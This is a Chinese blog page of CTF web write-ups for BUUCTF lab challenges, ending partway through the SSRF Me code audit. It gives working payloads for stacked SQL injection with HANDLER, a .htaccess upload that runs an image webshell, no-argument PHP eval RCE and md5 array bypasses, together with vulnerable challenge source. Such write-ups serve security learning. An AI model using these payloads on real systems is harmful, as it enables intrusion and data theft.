<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    
    
    <title>BUUCTF web练习5 | Damya&#39;s Blog | あややこやや</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="个人ctf竞赛">
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
    
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	true,
            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
            d: JSON.parse('{"app_id":null}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
    
<link rel="alternate" href="/atom.xml" title="Damya's Blog" type="application/atom+xml">
</head>


<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="">
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Damya</h5>
          <a href="mailto:397526596@qq.com" title="397526596@qq.com" class="mail">
            
              <span>3</span>
            
              <span>9</span>
            
              <span>7</span>
            
              <span>5</span>
            
              <span>2</span>
            
              <span>6</span>
            
              <span>5</span>
            
              <span>9</span>
            
              <span>6</span>
            
              <span>@</span>
            
              <span>q</span>
            
              <span>q</span>
            
              <span>.</span>
            
              <span>c</span>
            
              <span>o</span>
            
              <span>m</span>
            
          </a>
        </hgroup>
        
        <ul class="menu-link">
          
              <li>
                <a href="https://github.com/DamyaHome" target="_blank">
                  <i class="icon icon-lg icon-github"></i>
                </a>
              </li>
            
        </ul>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                HOME
              </a>
            </li>
        
            <li class="">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                CATEGORIES
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                TAGS
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                ARCHIVES
              </a>
            </li>
        
            <li class="">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                ABOUT
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>BUUCTF web练习5</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/banner.jpg" class="header-bg">
    <div class="container fade-scale">
        <h1 class="title">BUUCTF web练习5</h1>
        <h5 class="subtitle">
            
                <time datetime="2020-10-07T13:12:09.000Z" itemprop="datePublished" class="page-time">
  2020-10-07
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup-web/">ctf writeup web</a></li></ul>

            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>


<div class="container body-wrap">
    <article id="post-BUUCTF-web练习5"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">BUUCTF web练习5</h1>
        <div class="post-meta">
            <time class="post-time" title="2020-10-07 21:12:09" datetime="2020-10-07T13:12:09.000Z"  itemprop="datePublished">2020-10-07</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup-web/">ctf writeup web</a></li></ul>



            

            


            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p><a href="http://202bc5e9-02e8-4c36-9793-151b247a806c.node3.buuoj.cn" target="_blank" rel="noopener">http://202bc5e9-02e8-4c36-9793-151b247a806c.node3.buuoj.cn</a></p>
<p>经测试是字符型注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos; or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./1.png" title="图片" data-fancybox="images"><img src="./1.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>尝试联合查询,爆出了黑名单,先用show查着</p>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./2.png" title="图片" data-fancybox="images"><img src="./2.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
<p>根据匹配,先闭合语句再进行查询<br><figure class="image-box">
                <a rel=BUUCTF web练习5 href="./3.png" title="图片" data-fancybox="images"><img src="./3.png" alt="图片" title class></a>
                <p>图片</p>
            </figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos;;show databases;#</span><br><span class="line">?inject=1&apos;;show tables;#</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./4.png" title="图片" data-fancybox="images"><img src="./4.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>看到明显的FlagHere表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos;;show tables;show columns from FlagHere;show columns from words;#</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./5.png" title="图片" data-fancybox="images"><img src="./5.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>在mysql里还能使用handler进行查询,具体使用<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">官方文档</a></p>
<p>handler…open语句将打开一个表,使其可以使用后续handler…read语句进行访问,该表对象未被其他会话共享,并且在会话调用handler…close或会话终止之前不会关闭</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./6.png" title="图片" data-fancybox="images"><img src="./6.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>flag{901a13f0-67cb-4dd5-b765-0d2c02c91e81}</p>
<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p><a href="http://5f42ce42-df7b-494b-bf63-bab03cd0f852.node3.buuoj.cn" target="_blank" rel="noopener">http://5f42ce42-df7b-494b-bf63-bab03cd0f852.node3.buuoj.cn</a></p>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./7.png" title="图片" data-fancybox="images"><img src="./7.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>过滤得很严,只能上传图片,但.htaccess也可以上传</p>
<p>传入.htaccess文件作为php解析器,使我们传入的图片马里包含的php语句生效</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;.htaccess&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./8.png" title="图片" data-fancybox="images"><img src="./8.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./9.png" title="图片" data-fancybox="images"><img src="./9.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>在用蚁剑连接时连接图片地址</p>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./10.png" title="图片" data-fancybox="images"><img src="./10.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>进到根目录获得flag</p>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./11.png" title="图片" data-fancybox="images"><img src="./11.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>flag{29c63dce-7ee9-4f02-a809-c41bf114cd19}</p>
<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p><a href="http://b8053621-499f-4613-8852-d66828da67fe.node3.buuoj.cn" target="_blank" rel="noopener">http://b8053621-499f-4613-8852-d66828da67fe.node3.buuoj.cn</a></p>
<p>先dirmap扫个目录</p>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./12.png" title="图片" data-fancybox="images"><img src="./12.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>看到有.git隐藏文件,用githack恢复</p>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./13.png" title="图片" data-fancybox="images"><img src="./13.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line"><span class="comment">//过滤伪协议</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line"><span class="comment">//正则匹配,传参会被替换成NULL且语句的合法形式是a(b());</span></span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line"><span class="comment">//过滤了一些关键字</span></span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="方法一-利用常量函数"><a href="#方法一-利用常量函数" class="headerlink" title="方法一:利用常量函数"></a>方法一:利用常量函数</h3><p>无参RCE需要一些php自带常量的函数来构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir()) //首先想到的是输出目录,如何指定当前目录?</span><br><span class="line">?exp=print_r(scandir(current(localeconv()))) //current(localeconv())结合,输出本地数组的值</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./14.png" title="图片" data-fancybox="images"><img src="./14.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>php里有个next()函数可以用来读取数组的下一位元素,但在这题中不能连续使用,因为不适用a(b())格式,可flag.php正巧在倒数第二位,所以可以先用array_reverse()将数组倒序再进行读取,根据代码注释采用highlight_file()进行输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./15.png" title="图片" data-fancybox="images"><img src="./15.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>flag{16bab8e9-4333-4ff6-9ca3-ef4b717467ad}</p>
<h3 id="方法二-利用session"><a href="#方法二-利用session" class="headerlink" title="方法二:利用session"></a>方法二:利用session</h3><p>这是看大佬博客发现的方法,payload如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>
<p>首先需要理解session的工作原理</p>
<ol>
<li>首先使用session_start()函数进行初始化</li>
<li>当执行PHP脚本时，通过使用$_SESSION超全局变量注册session变量</li>
<li>当PHP脚本执行结束时，未被销毁的session变量会被自动保存在本地一定路径下的session库中，这个路径可以通过php.ini文件中的session.save_path指定，下次浏览网页时可以加载使用</li>
</ol>
<p>而session_start()初始化的东西可以在cookie里使用默认值PHPSESSID或者php.ini中设定的session.name进行文件读取，如果读取到了这个cookie将会创建$_SESSION变量并从相应目录中读取文件，并将字符装入变量中；如果没读取到也会创建$_SESSION变量和session文件并返回值。</p>
<p>获取到session_start()的初始值后，session_id()可以用来获取session会话的id，在cookie里指定到flag.php后进行读取，再用show_source()进行输出。</p>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./16.png" title="图片" data-fancybox="images"><img src="./16.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p><a href="http://a8085622-bd11-414f-9ac0-6bebed5d4231.node3.buuoj.cn" target="_blank" rel="noopener">http://a8085622-bd11-414f-9ac0-6bebed5d4231.node3.buuoj.cn</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line">	<span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">	$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">	$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">	$gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">	<span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">	$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">	highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;Please input first</span><br></pre></td></tr></table></figure>
<p>主要进行了GET方面$gg和$id的md5判断,和POST方面的$passwd密码传参<br>直接数组绕过md5判断,数字加字母绕过密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?gg[]=a&amp;id[]=b</span><br><span class="line">passwd=1234567a</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./17.png" title="图片" data-fancybox="images"><img src="./17.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>flag{9cada024-2b17-4a01-ad45-23871db3d3c9}</p>
<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p><a href="http://e695ad48-e686-4361-a809-93147a6a1133.node3.buuoj.cn" target="_blank" rel="noopener">http://e695ad48-e686-4361-a809-93147a6a1133.node3.buuoj.cn</a></p>
<p>将代码进行排版,是个flask的框架</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          </span><br><span class="line">        <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<p>附带Hint: flag is in ./flag.txt<br>审计之:</p>
<ol>
<li>三个路由,index用来获取源码,geneSign用来生成md5,De1ta为挑战.</li>
